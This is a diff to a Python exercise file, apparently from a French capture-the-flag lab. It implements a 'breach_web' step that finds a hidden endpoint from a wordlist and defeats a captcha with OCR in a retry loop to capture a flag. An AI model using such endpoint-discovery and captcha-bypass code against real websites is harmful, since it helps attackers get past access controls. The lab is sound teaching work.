@@ -12,6 +12,8 @@ from pathlib import Path
 import requests
 
 from tp3.utils.config import logger
+from tp3.utils.config import logger
+from tp3.utils.session import Session
 
 def find_endpoint(session, target):
     # on récupère le fichier wordlist.txt qui est à côté de ce fichier
@@ -42,7 +44,26 @@ def breach_web(target: str) -> tuple[str, int, bytes]:
 
     Affiche aussi Flag 1. Indices : requests, PIL, pytesseract.
     """
-    raise NotImplementedError
+    # on crée le navigateur partagé et on cherche la page cachée
+    http = requests.Session()
+    endpoint = find_endpoint(http, target)
+    if endpoint is None:
+        raise RuntimeError("Endpoint cache introuvable")
+
+    # on prépare la session web avec le même navigateur
+    session = Session(target, http)
+
+    # on essaie plusieurs fois (l'OCR peut se tromper sur un captcha)
+    for essai in range(10):
+        session.prepare_request()      # va chercher + lit le captcha
+        session.submit_request()       # envoie le code
+        if session.process_response():  # True = captcha bon
+            logger.info(f"FLAG_1: {session.get_flag()}")
+            return session.host, session.port, session.key
+        logger.info(f"Captcha rate (essai {essai + 1}), nouvel essai")
+
+    # si après 10 essais rien n'a marché
+    raise RuntimeError("Captcha non resolu apres plusieurs essais")
 
 
 def breach_network(host: str, port: int, key: bytes) -> str:
